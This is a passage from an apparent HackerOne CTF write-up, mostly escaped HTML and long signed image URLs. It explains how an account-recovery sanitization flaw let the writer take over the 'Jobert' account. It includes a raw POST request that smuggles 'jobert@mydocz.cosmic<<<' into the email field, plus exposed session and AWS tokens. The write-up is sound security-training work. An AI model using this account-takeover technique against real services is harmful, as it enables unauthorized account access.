6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=21bc2eed59073233f2197b5aeea1dc52c4b26b40224bcaae1abb5d075abbf675\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YV5vArCXCBL2HWnqN7MjJBT2?response-content-disposition=attachment%3B%20filename%3D%22support-page.png%22%3B%20filename%2A%3DUTF-8%27%27support-page.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=21bc2eed59073233f2197b5aeea1dc52c4b26b40224bcaae1abb5d075abbf675\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"first-vulnerability\"\u003eFirst vulnerability\u003c/h2\u003e\n\n\u003cp\u003eBefore hitting on the first vulnerability it\u0026#39;s worth noting that I attempted a variety of things:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eCross site scripting in the username: No\u003c/li\u003e\n\u003cli\u003eTemplate injection in the PDF via username: No\u003c/li\u003e\n\u003cli\u003eUpload SVG\u0026#39;s instead of PNG / JPG: No\u003c/li\u003e\n\u003cli\u003eRegister the same username as someone else: No\u003c/li\u003e\n\u003cli\u003eEdit the profile of a different user ID: No\u003c/li\u003e\n\u003cli\u003eQR codes - so many QR codes: No\u003c/li\u003e\n\u003cli\u003eOthers: No\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eAt this point there were still many additional things to try, however I noticed that the first hint for this CTF had been posted:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"hint-tweet.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ELBi7b1Xsi3Z5yt4gWSGhguj?response-content-disposition=attachment%3B%20filename%3D%22hint-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27hint-tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=3ac11de9c8e60beeac68c8db107c23117902affc71afd13b960560f844fea808\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ELBi7b1Xsi3Z5yt4gWSGhguj?response-content-disposition=attachment%3B%20filename%3D%22hint-tweet.png%22%3B%20filename%2A%3DUTF-8%27%27hint-tweet.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=3ac11de9c8e60beeac68c8db107c23117902affc71afd13b960560f844fea808\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis first hint was actually \u003cem\u003e2\u003c/em\u003e hints in one.  I had seen Jobert\u0026#39;s testimonial on the challenge site login page initially, but did not think anything of it.  Going back to it, the hint is obvious:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"jobert-login.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SsPgyrHnkhz4R1BAAvYxW2H9?response-content-disposition=attachment%3B%20filename%3D%22jobert-login.png%22%3B%20filename%2A%3DUTF-8%27%27jobert-login.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=b323cca6f028aa9863e6e30be3e9202b750051bbeeab8003671644e38f0bbc50\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/SsPgyrHnkhz4R1BAAvYxW2H9?response-content-disposition=attachment%3B%20filename%3D%22jobert-login.png%22%3B%20filename%2A%3DUTF-8%27%27jobert-login.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=b323cca6f028aa9863e6e30be3e9202b750051bbeeab8003671644e38f0bbc50\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe can see there is a property \u003ccode\u003edata-email\u003c/code\u003e with the value \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e.  As far as I know \u003ccode\u003e.cosmic\u003c/code\u003e isn\u0026#39;t a valid TLD, so our only use for this email was going to be on the challenge website.  To confirm this, I attempted to register an account with \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e as my listed email address.  Sure enough, the server reported an error indicating that the email was already in use.\u003c/p\u003e\n\n\u003cp\u003eThat leads to the second part of the hint: \u003ccode\u003eCan anyone here help us with some regex\u003c/code\u003e.  It was this second part of the hint that was the biggest help.  When registering an account normally I had observed two behaviours:\u003c/p\u003e\n\n\u003cp\u003e1) Special characters are silently stripped from the \u003ccode\u003eName\u003c/code\u003e and \u003ccode\u003eUsername\u003c/code\u003e fields\u003cbr\u003e\n2) QR recovery codes contain details for the account registered\u003c/p\u003e\n\n\u003cp\u003eWhen registering \u003ccode\u003edemo@demo.com\u003c/code\u003e as a user account, for example, the following QR recovery code is given:\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"qr-code-demo.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G6mQvFY35nJRaPxthS9T1mXf?response-content-disposition=attachment%3B%20filename%3D%22qr-code-demo.png%22%3B%20filename%2A%3DUTF-8%27%27qr-code-demo.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=d131429ad8cbd29c25af28aac4fc449cafb3d51a325baddee5ead2c6df2bf37c\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/G6mQvFY35nJRaPxthS9T1mXf?response-content-disposition=attachment%3B%20filename%3D%22qr-code-demo.png%22%3B%20filename%2A%3DUTF-8%27%27qr-code-demo.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3G9JiTuJ6qb2%2F4wYsuXqZAjjjsCgg1mXnpWD2MBpvjLmy20fnWfTyEpbZx69BhUOjIiXGUwMwyU3vIR8mTDDVd0lLxGqVwqo7wgDElekHdTEW3qhMPXMlt6DlI6yj8Gdba%2FBl9Vc01EccnsQcPWyVJry%2FS5ynL9DMtJAAAFirbxDGfh3YyQKCitVKKFFQ%2BXcUVp%2FSwwBBOTy19C2elhYtpl6vcpcY0%2FpxhMV%2FLT11lv%2FW2w21ED7vsm1c%2FDgyMyGhcc5jxtzWgSuplAxsWTwQc5B1WrLELk6MdDLXcvxB6lqSlYR3jek%2FEqa3e3t%2FxycmED7JcchnTpltDpgBiVe4qfO%2B85c9LeAT9plTAMKDqqv8FOusBsw37kCqQM4gZ7GwocFGWO%2Bb%2BbNa2dgEi%2Fv9cXsb1AOYUnwz%2B%2FyPyUSoTx0mdn2JtBFbkLI2hWmV1Y9Plg4ywi43mIKFY5BXMieUzgwCaeF0glcm8O%2F5kugCvuf01QuIauHjpwGSFMitZi1h52iDxD6TQNrXkM8ak7hW52tsH0VpvrBIvM3fFeRl4cr81y%2FuM3ueoyxszwreZZnbZK4WIuk8LU9YhohKDj6BRCCLOA1ZWZip14mKPOWPa8WaAzVovmI9BYDR0AxC4M%2FMywNMPj4r12n4DpTYCcHFvsA18GtoCtKML64R8uPhkQw%3D%3D\u0026amp;X-Amz-Signature=d131429ad8cbd29c25af28aac4fc449cafb3d51a325baddee5ead2c6df2bf37c\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThis code decodes to (using any QR code decoder):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e64656d6f4064656d6f2e636f6d:0f31a3904e808a832c2cef2bdfab06b7168ff6103637a14c72ca72cb31784644056ea258f8f81999d5d87a2c3ea7ef2903c857ac2e4daef6eaf8c99d6264a6976d8ee331f68a0d5b5b8bf75a7324e63c2e7322d81104d6c2b5acbbeafb4d91f6515867767f661d352bfcbe19a9579cfa194f7e4708696acffe1d07927a6905ff\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThe first part is \u003ccode\u003e64656d6f4064656d6f2e636f6d\u003c/code\u003e.  Converting this from \u003ccode\u003ehex\u003c/code\u003e to \u003ccode\u003eascii\u003c/code\u003e shows our email \u003ccode\u003edemo@demo.com\u003c/code\u003e.  The hint says we need to figure out a regex for Jobert\u0026#39;s email that we have discovered.  After a couple failed tries at inserting whitespace at the end of the email to register with I realized that we can use the server\u0026#39;s special character deletion behaviour to our advantage.  Here\u0026#39;s the steps:\u003c/p\u003e\n\n\u003cp\u003eFirst: register a new account.  In the email field we need to include special characters, but these are blocked by client side Javascript.  Burp Suite Pro easily solves that for us.  We can simply edit the raw \u003ccode\u003ePOST\u003c/code\u003e request to the \u003ccode\u003e/register\u003c/code\u003e endpoint to contain these special characters.  For example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ePOST /register HTTP/1.1\nHost: h1-415.h1ctf.com\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 153\nCookie: _csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384; session=eyJfY3NyZl90b2tlbiI6IjQwNzg0OWViZTE2YWRlMWNmYTk5ODhlMjQ5MTY1Y2U4ZWMxMWUzODQiLCJjaGF0IjpbXSwiZW1haWwiOiJmYWtlQGZha2U4OC5jb20iLCJ1c2VyX3R5cGUiOjN9.XiebQg.uxyF3T2cF7YDXjmsiDhJWJnrmUA\n\nname=demo\u0026amp;email=jobert%40mydocz.cosmic\u0026lt;\u0026lt;\u0026lt;\u0026amp;username=demo\u0026amp;password=password123\u0026amp;password-confirmation=password123\u0026amp;_csrf_token=407849ebe16ade1cfa9988e249165ce8ec11e384\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIn the above \u003ccode\u003ePOST\u003c/code\u003e request we use \u003ccode\u003ejobert%40mydocz.cosmic\u0026lt;\u0026lt;\u0026lt;\u003c/code\u003e instead of \u003ccode\u003ejobert%40mydocz.cosmic\u003c/code\u003e.  My first try at this failed and threw me off for a bit.  It turns out that someone else had already registered \u003ccode\u003ejobert%40mydocz.cosmic\u0026lt;\u0026lt;\u0026lt;\u003c/code\u003e!\u003c/p\u003e\n\n\u003cp\u003eNow we\u0026#39;re ready for the second step: At this point we have an account registered with a variation of Jobert\u0026#39;s email, but nothing more.  As soon as we register the account we are given a QR recovery code however.  We can save this code and log out.  Now we access the account recovery page at \u003ccode\u003e/recover\u003c/code\u003e.  When we upload the QR code it will contain the email \u003ccode\u003ejobert@mydocz.cosmic\u0026lt;\u0026lt;\u0026lt;\u003c/code\u003e.  This will be sanitized down to \u003ccode\u003ejobert@mydocz.cosmic\u003c/code\u003e and is otherwise a valid recovery code so access is granted.  At last we now have access Jobert\u0026#39;s account!\u003c/p\u003e\n\n\u003cp\u003e\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"first-vuln.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hbA2eHZSegQ5GeMcodxhd7Et?response-content-disposition=attachment%3B%20filename%3D%22first-vuln.png%22%3B%20filename%2A%3DUTF-8%27%27first-vuln.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQTYNHLLAI%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T065108Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHZ%2BW3HUv1n%2B6aR51XKyQUoltUs4dpenL8C5Ngq%2FaRRRAiEAmfsKW6s44zslbtLbjio7lyByPFrM4HhkqWc4BlKqI%2FsqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDEk2ujSH9wgIeNJFfSqRA5L87pajd4uBiMOahwiQWY9MCcYfdnrcw1IGaRg5TpxW7DR87N3npEJ347tYQoNG4qvz83ZIfPJaoV16%2BHSbvgHCloy0L2IJebFkXavQ%2FqP76i9C%2Fflz0T%2FAY7BQexVBAB81BDbhmxnE9q9peEXcv7DxPs6yUKcdy540RKUrN7uslxSA7j3